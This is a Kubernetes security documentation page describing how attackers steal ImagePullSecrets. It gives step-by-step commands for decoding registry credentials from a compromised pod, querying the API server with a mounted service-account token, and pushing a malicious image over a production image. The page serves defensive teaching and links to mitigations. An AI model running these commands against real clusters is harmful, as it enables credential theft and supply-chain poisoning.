---
sidebar_position: 18
title: "ImagePullSecrets Theft"
description: "Attack scenario demonstrating how attackers extract image pull secrets to gain unauthorized access to private container registries."
keywords: [kubernetes security, imagepullsecrets, container registry security, docker registry credentials, secrets theft, private registry access, registry authentication, kubernetes secrets, docker credentials, container security]
tags: [attack-vector, secrets, registry, supply-chain, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/secrets_management/imagepullsecrets_security/
  - /docs/attack_vectors/insecure_secrets_management/
  - /docs/attack_vectors/supply_chain_attacks/
  - /docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/insecure_rbac_permissions_mitigation/
---

# ImagePullSecrets Theft

Kubernetes clusters often use **private container registries** to store proprietary images. Access to these registries is controlled through **ImagePullSecrets**, which contain registry credentials. If an attacker gains access to a pod or namespace, they can extract these secrets to access private images, steal intellectual property, or inject malicious images into the registry.

This attack demonstrates how compromised pods or excessive RBAC permissions allow attackers to steal registry credentials and pivot to container registry infrastructure.

---

## Exploitation Steps

An attacker with access to a pod or namespace can extract ImagePullSecrets in multiple ways.

### 1. Extract Secrets from Pod Service Account

Most pods automatically mount service account tokens and have access to secrets in their namespace.

```bash
# Inside a compromised pod
kubectl get secrets -n production

# Look for docker-registry type secrets
kubectl get secrets -n production -o json | grep docker
```

### 2. Decode Docker Registry Credentials

ImagePullSecrets are base64-encoded Docker config files.

```bash
# Get the secret
kubectl get secret registry-credentials -n production -o yaml

# The secret contains a .dockerconfigjson field
kubectl get secret registry-credentials -n production -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
```

**Output:**

```json
{
  "auths": {
    "registry.company.com": {
      "username": "service-account",
      "password": "P@ssw0rd123!",
      "auth": "c2VydmljZS1hY2NvdW50OlBAc3N3MHJkMTIzIQ=="
    }
  }
}
```

### 3. Extract from Pod Specification

Secrets referenced in pod specs can be retrieved if the attacker has pod read permissions.

```bash
# List all pods and their imagePullSecrets
kubectl get pods -n production -o json | jq '.items[] | {name: .metadata.name, secrets: .spec.imagePullSecrets}'

# Get the secret directly
kubectl get secret regcred -n production -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
```

### 4. Access from Mounted Service Account

If a pod has a service account with secrets access, the attacker can query secrets from within the container.

```bash
# From inside the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

curl -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  $APISERVER/api/v1/namespaces/production/secrets/registry-credentials
```

### 5. Use Stolen Credentials to Access Registry

Once credentials are extracted, the attacker can access the private registry.

```bash
# Login to the registry
echo "P@ssw0rd123!" | docker login registry.company.com -u service-account --password-stdin

# List available images
curl -u service-account:P@ssw0rd123! https://registry.company.com/v2/_catalog

# Pull proprietary images
docker pull registry.company.com/private/payment-service:latest

# Push malicious images
docker tag malicious-image:latest registry.company.com/private/payment-service:latest
docker push registry.company.com/private/payment-service:latest
```

### Result

The attacker now has:

- **Full access to private container registry** with credentials
- **Ability to steal proprietary images** containing intellectual property, secrets, and source code
- **Capability to push malicious images** that will be deployed by the CI/CD pipeline
- **Supply chain attack vector** by poisoning trusted images
- **Lateral movement** to other clusters using the same registry

---

## Mitigation

See the mitigation strategies in:

[Securing ImagePullSecrets](/docs/best_practices/cluster_setup_and_hardening/secrets_management/imagepullsecrets_security)

---

## References

This article is based on information from the following official sources:

1. [Pull an Image from a Private Registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/) - Kubernetes Documentation
2. [Secrets](https://kubernetes.io/docs/concepts/configuration/secret/) - Kubernetes Documentation
3. [Configure Service Accounts for Pods](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) - Kubernetes Documentation
